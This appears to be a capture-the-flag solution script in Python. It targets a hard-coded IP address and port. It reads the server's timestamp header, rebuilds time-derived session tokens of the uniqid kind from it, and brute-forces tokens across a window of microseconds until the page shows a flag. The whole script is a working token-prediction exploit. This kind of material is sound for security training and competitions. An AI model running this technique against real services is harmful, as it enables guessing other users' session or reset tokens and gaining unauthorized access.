import requests
from bs4 import BeautifulSoup

URL = "http://139.162.5.230:10176"

def token_from_time(t: float) -> str:
    sec = int(t)
    usec = int((t - sec) * 1_000_000)
    return (f"{sec:08x}{usec:05x}")[:11]

s = requests.Session()

# 1) First request assigns token and gives us X-Request-Timestamp
r1 = s.get(URL, allow_redirects=False)
ts = r1.headers.get("X-Request-Timestamp")
if not ts:
    raise SystemExit("No X-Request-Timestamp header found")

t0 = float(ts)
print("Server timestamp:", t0)

# 2) Search a small window around t0 (e.g., +/- 20ms, step 1us or 10us)
# Stepping 10us is usually enough and very fast.
window_us = 20_000
step_us = 10

for delta_us in range(-window_us, window_us + 1, step_us):
    t = t0 + delta_us / 1_000_000
    cand = token_from_time(t)

    r2 = s.get(URL, params={"token": cand})
    if "Flag:" in r2.text:
        print("FOUND:", cand)
        print(r2.text)
        break
else:
    print("Not found. Increase window or reduce step.")
